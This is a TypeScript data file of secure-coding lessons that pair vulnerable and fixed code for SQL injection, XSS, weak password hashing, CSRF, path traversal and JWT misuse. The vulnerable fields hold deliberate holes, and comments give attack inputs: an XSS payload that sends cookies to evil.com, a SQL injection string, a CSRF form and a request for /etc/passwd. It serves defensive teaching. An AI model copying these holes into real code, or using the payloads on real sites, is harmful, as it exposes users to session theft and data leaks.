// Secure code examples data
import { extendedCodeExamples } from "./code-examples-extended";

export interface CodeExample {
  id: string;
  title: string;
  language: string;
  category: string;
  description: string;
  vulnerable: string;
  secure: string;
  explanation: string;
}

export const codeExamples: CodeExample[] = [
  {
    id: "sql-injection",
    title: "SQL Injection Prevention",
    language: "TypeScript",
    category: "Injection",
    description: "Prevent SQL injection by using parameterized queries instead of string concatenation.",
    vulnerable: `// VULNERABLE - String concatenation
async function getUser(userId: string) {
  const query = \`SELECT * FROM users WHERE id = '\${userId}'\`;
  const result = await db.query(query);
  return result.rows[0];
}

// Attacker input: ' OR '1'='1' --
// Resulting query: SELECT * FROM users WHERE id = '' OR '1'='1' --'`,
    secure: `// SECURE - Parameterized query
async function getUser(userId: string) {
  const query = 'SELECT * FROM users WHERE id = $1';
  const result = await db.query(query, [userId]);
  return result.rows[0];
}

// Using an ORM (Prisma)
async function getUserSafe(userId: string) {
  return await prisma.user.findUnique({
    where: { id: userId }
  });
}`,
    explanation: "Parameterized queries separate SQL code from data, preventing attackers from injecting malicious SQL. ORMs provide an additional layer of protection by abstracting database queries.",
  },
  {
    id: "xss-prevention",
    title: "Cross-Site Scripting (XSS) Prevention",
    language: "TypeScript/React",
    category: "XSS",
    description: "Prevent XSS attacks by properly sanitizing and encoding user input.",
    vulnerable: `// VULNERABLE - Directly inserting user content
function Comment({ content }: { content: string }) {
  return (
    <div dangerouslySetInnerHTML={{ __html: content }} />
  );
}

// Attacker input: <script>document.cookie</script>
// or: <img src=x onerror="fetch('https://evil.com?c='+document.cookie)">`,
    secure: `// SECURE - Using React's built-in escaping
function Comment({ content }: { content: string }) {
  return <div>{content}</div>; // React auto-escapes
}

// When HTML is needed, use a sanitizer
import DOMPurify from 'dompurify';

function RichComment({ content }: { content: string }) {
  const sanitized = DOMPurify.sanitize(content, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br'],
    ALLOWED_ATTR: []
  });
  return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
}`,
    explanation: "React automatically escapes content rendered with JSX expressions. When HTML rendering is required, use a trusted sanitization library like DOMPurify to strip dangerous elements and attributes.",
  },
  {
    id: "password-hashing",
    title: "Secure Password Hashing",
    language: "TypeScript",
    category: "Authentication",
    description: "Properly hash passwords using bcrypt instead of weak algorithms.",
    vulnerable: `// VULNERABLE - Weak hashing
import crypto from 'crypto';

function hashPassword(password: string): string {
  return crypto.createHash('md5').update(password).digest('hex');
}

// Problems:
// - MD5 is fast (millions of hashes/sec)
// - No salt (rainbow table attacks)
// - No key stretching`,
    secure: `// SECURE - Using bcrypt with proper cost factor
import bcrypt from 'bcryptjs';

async function hashPassword(password: string): Promise<string> {
  const saltRounds = 12; // Adjust based on server capability
  return await bcrypt.hash(password, saltRounds);
}

async function verifyPassword(
  password: string,
  hash: string
): Promise<boolean> {
  return await bcrypt.compare(password, hash);
}

// Password validation
function validatePassword(password: string): string[] {
  const errors: string[] = [];
  if (password.length < 12) errors.push('Min 12 characters');
  if (!/[A-Z]/.test(password)) errors.push('Needs uppercase');
  if (!/[a-z]/.test(password)) errors.push('Needs lowercase');
  if (!/[0-9]/.test(password)) errors.push('Needs number');
  if (!/[^A-Za-z0-9]/.test(password)) errors.push('Needs special char');
  return errors;
}`,
    explanation: "Bcrypt is designed for password hashing with built-in salt generation and configurable work factor. The cost factor (salt rounds) makes brute-force attacks computationally expensive.",
  },
  {
    id: "csrf-protection",
    title: "CSRF Protection",
    language: "TypeScript",
    category: "CSRF",
    description: "Protect against Cross-Site Request Forgery attacks with tokens and SameSite cookies.",
    vulnerable: `// VULNERABLE - No CSRF protection
app.post('/api/transfer', async (req, res) => {
  const { to, amount } = req.body;
  // No verification that request originated from our app
  await transferFunds(req.user.id, to, amount);
  res.json({ success: true });
});

// Attacker's page:
// <form action="https://bank.com/api/transfer" method="POST">
//   <input name="to" value="attacker" />
//   <input name="amount" value="10000" />
// </form>
// <script>document.forms[0].submit()</script>`,
    secure: `// SECURE - CSRF token validation
import { randomBytes } from 'crypto';

// Generate token
function generateCSRFToken(): string {
  return randomBytes(32).toString('hex');
}

// Middleware to validate
function csrfProtection(req: Request, res: Response, next: NextFunction) {
  const token = req.headers['x-csrf-token'] as string;
  const sessionToken = req.session.csrfToken;

  if (!token || token !== sessionToken) {
    return res.status(403).json({ error: 'Invalid CSRF token' });
  }
  next();
}

// Also set SameSite cookie attribute
res.cookie('session', sessionId, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict',
  maxAge: 3600000
});`,
    explanation: "CSRF tokens ensure that form submissions originate from your application. Combined with SameSite cookies, they provide robust protection against cross-site request forgery attacks.",
  },
  {
    id: "path-traversal",
    title: "Path Traversal Prevention",
    language: "TypeScript",
    category: "File Security",
    description: "Prevent directory traversal attacks when handling file paths.",
    vulnerable: `// VULNERABLE - Direct path concatenation
import { readFileSync } from 'fs';
import path from 'path';

app.get('/api/files/:name', (req, res) => {
  const filePath = path.join('./uploads', req.params.name);
  const content = readFileSync(filePath, 'utf-8');
  res.send(content);
});

// Attacker request: GET /api/files/../../etc/passwd
// Resolves to: /etc/passwd`,
    secure: `// SECURE - Validate and sanitize file paths
import { readFileSync } from 'fs';
import path from 'path';

const UPLOAD_DIR = path.resolve('./uploads');

app.get('/api/files/:name', (req, res) => {
  // Remove path separators and null bytes
  const safeName = path.basename(req.params.name)
    .replace(/\\0/g, '');

  const filePath = path.resolve(UPLOAD_DIR, safeName);

  // Verify the resolved path is within allowed directory
  if (!filePath.startsWith(UPLOAD_DIR)) {
    return res.status(403).json({ error: 'Access denied' });
  }

  // Check file exists
  if (!existsSync(filePath)) {
    return res.status(404).json({ error: 'File not found' });
  }

  const content = readFileSync(filePath, 'utf-8');
  res.send(content);
});`,
    explanation: "Always resolve file paths to their absolute form and verify they remain within the intended directory. Use path.basename() to strip directory components and check the resolved path prefix.",
  },
  {
    id: "jwt-security",
    title: "JWT Security Best Practices",
    language: "TypeScript",
    category: "Authentication",
    description: "Implement JWT tokens securely with proper validation, expiration, and storage.",
    vulnerable: `// VULNERABLE - Poor JWT implementation
import jwt from 'jsonwebtoken';

// Using 'none' algorithm
const token = jwt.sign(payload, '', { algorithm: 'none' });

// Weak secret
const token2 = jwt.sign(payload, 'secret123');

// No expiration
const token3 = jwt.sign({ userId: '123' }, SECRET);

// Storing in localStorage (XSS vulnerable)
localStorage.setItem('token', token);`,
    secure: `// SECURE - Proper JWT implementation
import jwt from 'jsonwebtoken';

const SECRET = process.env.JWT_SECRET!; // Strong, env-based secret

interface TokenPayload {
  userId: string;
  role: string;
}

function generateTokens(payload: TokenPayload) {
  const accessToken = jwt.sign(payload, SECRET, {
    algorithm: 'HS256',
    expiresIn: '15m',
    issuer: 'scr-app',
    audience: 'scr-api',
  });

  const refreshToken = jwt.sign(
    { userId: payload.userId },
    SECRET,
    { expiresIn: '7d' }
  );

  return { accessToken, refreshToken };
}

function verifyToken(token: string): TokenPayload {
  return jwt.verify(token, SECRET, {
    algorithms: ['HS256'], // Explicitly allow only expected alg
    issuer: 'scr-app',
    audience: 'scr-api',
  }) as TokenPayload;
}

// Store in httpOnly cookie (not localStorage)
res.cookie('accessToken', accessToken, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict',
  maxAge: 15 * 60 * 1000,
});`,
    explanation: "Use strong secrets, explicit algorithms, short expiration times, and httpOnly cookies. Never use the 'none' algorithm and always validate the algorithm during verification.",
  },
  ...extendedCodeExamples,
];
